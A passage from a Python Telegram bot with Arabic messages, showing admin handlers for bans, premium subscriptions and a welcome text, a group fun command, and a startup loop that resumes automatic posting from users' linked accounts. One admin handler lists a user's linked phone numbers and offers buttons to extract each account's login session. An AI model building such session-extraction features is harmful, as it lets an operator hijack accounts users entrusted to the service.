                    await message.reply_text(f"🟢 تم إلغاء حظر المستخدم بنجاح: `{unban_id}`")
                else:
                    await message.reply_text("ℹ️ المستخدم ليس محظوراً في النظام الحركي.")
            except ValueError: await message.reply_text("❌ يرجى إرسال آيدي رقمي صحيح.")

        elif state == "ADM_EXP_WELCOME" and uid == ADMIN_ID:
            user_states.pop(uid, None)
            await system_table.update_one({"_id": 1}, {"$set": {"welcome_msg": text}})
            await message.reply_text("✅ تم تعديل كود ونص رسالة الترحيب بنجاح!")

        elif state == "ADM_EXP_BTN_NAME" and uid == ADMIN_ID:
            btn_key = user_states[uid]["key"]
            user_states.pop(uid, None)
            await system_table.update_one({"_id": 1}, {"$set": {btn_key: text}})
            await message.reply_text(f"✅ تم تغيير اسم الزر بنجاح وحفظه سحابياً إلى:\n**{text}**")

        elif state == "ADM_EXP_USER_ID" and uid == ADMIN_ID:
            try:
                target_uid = int(text)
                user_states[uid] = {"state": "ADM_EXP_MONTHS", "target_uid": target_uid}
                await message.reply_text("🔢 **أرسل مدة التفعيل بالأشهر (رقم صافي):**")
            except ValueError: await message.reply_text("❌ يرجى إرسال آيدي رقمي صحيح.")

        elif state == "ADM_EXP_MONTHS" and uid == ADMIN_ID:
            try:
                months = int(text)
                target_uid = user_states[uid]["target_uid"]
                user_states.pop(uid, None)
                sys_settings = await system_table.find_one({"_id": 1})
                expire_date = datetime.now() + timedelta(days=30 * months)
                await users_table.update_one(
                    {"user_id": target_uid},
                    {"$set": {
                        "plan": "premium", "max_accs": sys_settings.get("premium_limit", 10),
                        "posting_interval": 60, "num_post_accs": "الكل", "expire_at": expire_date.isoformat(), "is_posting": False
                    }},
                    upsert=True
                )
                await message.reply_text(f"✅ **تم تفعيل وتحديث اشتراك المستخدم بنجاح!**\n👤 آيدي: `{target_uid}`\n📅 الصلاحية: `{months} شهر`")
            except ValueError: await message.reply_text("❌ يرجى إرسال رقم أشهر صحيح.")

        elif state == "ADM_INSPECT_ID" and uid == ADMIN_ID:
            user_states.pop(uid, None)
            try:
                target_uid = int(text)
                u_accs = await accounts_table.find({"user_id": target_uid}).to_list(length=100)
                if not u_accs: await message.reply_text("ℹ️ لا توجد أرقام مربوطة لهذا المستخدم."); return
                txt = f"🔍 **الأرقام التابعة للمستخدم `{target_uid}`:**\n\n"
                kb = []
                for idx, acc in enumerate(u_accs, start=1):
                    txt += f"{idx} - رقم الهاتف: `{acc['phone']}`\n"
                    kb.append([InlineKeyboardButton(f"📥 سحب جلسة الرقم {idx}", callback_data=f"adm_extract_{str(acc['_id'])}")])
                kb.append([InlineKeyboardButton("🔙 عودة للوحة", callback_data="admin_main_panel")])
                await message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb))
            except ValueError: await message.reply_text("❌ يرجى إرسال آيدي رقمي صحيح.")

# ==========================================
# 🎪 محرك أوامر التسلية العامة للمجموعات
# ==========================================
@app.on_message(filters.group & filters.text)
async def group_fun_handler(client: Client, message: Message):
    text = message.text.strip()
    if text.startswith("نسبة حبي لـ"):
        target_name = text.replace("نسبة حبي لـ", "").strip()
        if target_name: await message.reply_text(f"📊 نسبة حبك لـ **{target_name}** هي: `{random.randint(0, 100)}%` ❤️")
    elif text in ["txt", "..."]:
        await message.reply_text(f"💬 **سؤال:** لو سنحت لك فرصة لتغيير قرار واحد اتخذته بالماضي، فماذا سيكون؟")

# ==========================================
# 🚀 إقلاع وتشغيل المنصة السحابية واستعادة الحلقات
# ==========================================
async def main():
    # تهيئة النظام
    await init_system_config()
    
    await app.start()
    print("⚡ تم تشغيل المنصة السحابية المربوطة بـ MongoDB بنجاح وبأعلى درجات الاستقرار...")
    
    # استعادة النشر التلقائي الذكي للمستخدمين النشطين مباشرة من المونجو
    active_users = await users_table.find({"is_posting": True}).to_list(length=1000)
    for au in active_users:
        asyncio.create_task(user_individual_post_loop(au["user_id"]))
        
    await asyncio.Event().wait()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
